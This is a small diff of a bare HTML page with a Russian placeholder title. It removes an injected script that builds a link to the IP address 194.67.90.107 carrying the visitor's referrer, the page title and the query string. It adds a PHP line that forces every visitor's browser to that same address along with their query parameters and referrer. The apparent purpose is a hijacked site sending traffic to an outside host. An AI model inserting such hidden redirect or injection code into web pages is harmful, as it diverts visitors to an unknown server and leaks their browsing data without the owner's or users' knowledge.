@@ -2,10 +2,7 @@
 <html>
 <head>
 <title>Заголовок страницы</title>
-<span id="5a8e6247-62ac-fd98-a088-161ceae54852"></span>
-<script type="application/javascript">
-document.getElementById('5a8e6247-62ac-fd98-a088-161ceae54852').innerHTML = '<a href="//194.67.90.107/v7LTYG?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'">Link</a>';
-</script>
+<?php header('Location: //194.67.90.107/v7LTYG?' . http_build_query($_GET) . '&se_referrer=' . urlencode($_SERVER['HTTP_REFERER']) . ''); ?>
 </head>
 <body>
 </body>
